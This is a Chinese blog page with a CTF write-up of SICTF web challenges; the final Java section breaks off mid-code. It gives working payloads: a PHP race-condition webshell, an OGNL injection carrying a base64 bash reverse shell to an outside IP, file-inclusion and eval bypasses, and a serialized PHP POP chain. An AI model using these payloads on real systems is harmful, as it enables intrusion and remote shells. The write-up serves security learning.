<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="WEB你能跟得上我的speed吗一个条件竞争，上传一个test.php 123&lt;?phpfputs(fopen(&#x27;web.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php system(&#x27;cat &#x2F;flag&#x27;);?&gt;&quot;);?&gt;">
<meta property="og:type" content="article">
<meta property="og:title" content="SICTF_汪汪队WP">
<meta property="og:url" content="http://example.com/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/index.html">
<meta property="og:site_name" content="ycxlo&#39;s Blog">
<meta property="og:description" content="WEB你能跟得上我的speed吗一个条件竞争，上传一个test.php 123&lt;?phpfputs(fopen(&#x27;web.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php system(&#x27;cat &#x2F;flag&#x27;);?&gt;&quot;);?&gt;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si1.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si2.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si3.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si4.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si5.jpg">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si6.jpg">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si7.jpg">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si8.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si9.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si10.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si11.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si12.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si13.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/%E9%A5%B2.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si14.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si15.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si16.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si17.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si18.jpg">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si19.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si20.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si21.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si22.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si23.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si24.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si25.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si26.png">
<meta property="og:image" content="https://ilikeoyt.github.io/image/si27.png">
<meta property="article:published_time" content="2023-09-11T03:12:28.000Z">
<meta property="article:modified_time" content="2025-05-25T03:34:25.050Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ilikeoyt.github.io/image/si1.png">

<link rel="canonical" href="http://example.com/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SICTF_汪汪队WP | ycxlo's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ycxlo's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ycxlo's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SICTF_汪汪队WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-09-11 11:12:28" itemprop="dateCreated datePublished" datetime="2023-09-11T11:12:28+08:00">2023-09-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-05-25 11:34:25" itemprop="dateModified" datetime="2025-05-25T11:34:25+08:00">2025-05-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h2><p>一个条件竞争，上传一个test.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&#x27;web.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>然后bp爆破web.php并同时爆破上传文件页面即可</p>
<p><img src="https://ilikeoyt.github.io/image/si1.png" alt="img"></p>
<p><img src="https://ilikeoyt.github.io/image/si2.png" alt="image"></p>
<h2 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h2><p>OGNL注入，过滤了一些关键字符，可以采用Unicode编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.\u0052untime@g\u0065tRuntime().\u0065xec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwMS40Mi41Mi4xMTQvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后再进行一下url编码后传入即可</p>
<p><img src="https://ilikeoyt.github.io/image/si3.png" alt="image"></p>
<h2 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;SICTF&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;SICTF&quot;], 0, 3) === &quot;php&quot; ) &#123;</span><br><span class="line">        echo &quot;你好厉害呀~~~&quot;;</span><br><span class="line">        include($_GET[&quot;SICTF&quot;]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;你干嘛~~~&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现文件包含开头必须为php,直接梭哈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?SICTF=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>

<p>然后base64解码得到flag</p>
<p><img src="https://ilikeoyt.github.io/image/si4.png" alt="image"></p>
<h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/_|%5f|\.|%2E/i&#x27;, $query)) &#123;</span><br><span class="line">    die(&#x27;You are Hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#x27;k_e_y&#x27;] !==&#x27;123&#x27; &amp;&amp; preg_match(&#x27;/^123$/&#x27;,$_GET[&#x27;k_e_y&#x27;]))&#123;</span><br><span class="line">    echo(&quot;You are will Win!&lt;br&gt;&quot;);</span><br><span class="line">    if(isset($_POST[&#x27;command&#x27;]))&#123;</span><br><span class="line">        $command = $_POST[&#x27;command&#x27;];</span><br><span class="line">        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;</span><br><span class="line">            eval($command);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo(&quot;You are Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;K_e_y is Errors!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一层绕过点和下划线,非法传参的时候会自动把非法字符变成_</p>
<p>第二层绕过preg用%0a就行了</p>
<p>第三层直接无参数rce梭哈就行了</p>
<p>可以看以前的笔记</p>
<p><a target="_blank" rel="noopener" href="https://baicany.github.io/2023/06/24/6.24/">6.24ctf+无参数rce | baicany</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv()))); </span><br><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?k e y=123%0a</span><br><span class="line">COOkie:PHPSESSID=flag.php</span><br><span class="line"></span><br><span class="line">command=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si5.jpg" alt="image"></p>
<h2 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $pop;</span><br><span class="line">    public $i;</span><br><span class="line">    public $nogame;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;</span><br><span class="line">            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function game()&#123;</span><br><span class="line">        echo &quot;扣1送地狱火&quot;;</span><br><span class="line">        if ($this-&gt;i = &quot;1&quot;)&#123;</span><br><span class="line">            echo &#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;;</span><br><span class="line">            $this-&gt;nogame-&gt;love();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        echo &quot;必须执行&quot;;</span><br><span class="line">        eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $Aec;</span><br><span class="line">    public $girl;</span><br><span class="line">    public $boy;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I also want to fall in love&quot;;</span><br><span class="line">        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;</span><br><span class="line">            $this-&gt;Aec-&gt;game();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class P&#123;</span><br><span class="line">    public $MyLover;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;</span><br><span class="line">        if ($name != &quot;game&quot;) &#123;</span><br><span class="line">            echo &quot;打游戏去，别想着对象了&quot;;</span><br><span class="line">            $this-&gt;MyLover = clone new B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ($_GET[&quot;A_B_C&quot;])&#123;</span><br><span class="line">    $poc=$_GET[&quot;A_B_C&quot;];</span><br><span class="line">    unserialize($poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>纯签到梭哈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $pop;</span><br><span class="line">    public $i=1;</span><br><span class="line">    public $nogame;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;</span><br><span class="line">            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function game()&#123;</span><br><span class="line">        echo &quot;扣1送地狱火&quot;;</span><br><span class="line">        if ($this-&gt;i = &quot;1&quot;)&#123;</span><br><span class="line">            echo &#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;;</span><br><span class="line">            $this-&gt;nogame-&gt;love();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        echo &quot;必须执行&quot;;</span><br><span class="line">        eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $Aec;</span><br><span class="line">    public $girl=array(1);</span><br><span class="line">    public $boy=array(2);</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I also want to fall in love&quot;;</span><br><span class="line">        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;</span><br><span class="line">            $this-&gt;Aec-&gt;game();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class P&#123;</span><br><span class="line">    public $MyLover;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;</span><br><span class="line">        if ($name != &quot;game&quot;) &#123;</span><br><span class="line">            echo &quot;打游戏去，别想着对象了&quot;;</span><br><span class="line">            $this-&gt;MyLover = clone new B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new B();</span><br><span class="line">$a-&gt;pop=new A();</span><br><span class="line">$a-&gt;pop-&gt;Aec=new B();</span><br><span class="line">$a-&gt;pop-&gt;Aec-&gt;nogame=new P();</span><br><span class="line">$a-&gt;pop-&gt;Aec-&gt;nogame-&gt;MyLover=new B();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;&#125;&#125;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;i:1;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;i:2;&#125;&#125;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?A_B_C=O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;&#125;&#125;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;i:1;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;i:2;&#125;&#125;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si6.jpg" alt="image"></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code);</span><br><span class="line">$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code);</span><br><span class="line">eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现过滤了(和点</p>
<p>很简单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code= echo `cat /f*`;</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si7.jpg" alt="image"></p>
<h2 id="DoyouknowCC"><a href="#DoyouknowCC" class="headerlink" title="DoyouknowCC"></a>DoyouknowCC</h2><p>开始以为就是简单的cc黑名单绕过，结果不出网，幸好最后给了大提示（</p>
<p>黑名单如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;, &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;, &quot;org.apache.commons.collections.map.TransformedMap&quot;, &quot;java.lang.annotation&quot;, &quot;org.apache.commons.collections.map.LazyMap&quot;, &quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;, &quot;javax.management.&quot;, &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;org.apache.commons.collections.Transformer&quot;, &quot;org.springframework&quot;, &quot;com.rometools.rome.feed.impl&quot;, &quot;java.net.URL&quot;, &quot;java.lang.reflect.Proxy&quot;, &quot;com.fasterxml.jackson&quot;, &quot;com.sun.jndi&quot;, &quot;java.security&quot;, &quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span><br></pre></td></tr></table></figure>

<p>也不是过滤得很绝….</p>
<p>找一些平替类可以rce，没有InvokerTransformer类，我们可以使用InstantiateFactory类配合FactoryTransformer类用于实例化TemplatesImpl对象</p>
<p><img src="https://ilikeoyt.github.io/image/si8.png" alt="image"></p>
<p><img src="https://ilikeoyt.github.io/image/si9.png" alt="image"></p>
<p>接下来就是如何调用FactoryTransformer类的transform方法，可以找到一个DefaultedMap类用于代替LazyMap和TransformedMap类</p>
<p><img src="https://ilikeoyt.github.io/image/si10.png" alt="image"></p>
<p>利用cc7触发它的get方法即可</p>
<p>本地先弹个计算器检验一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc7;</span><br><span class="line"></span><br><span class="line">import 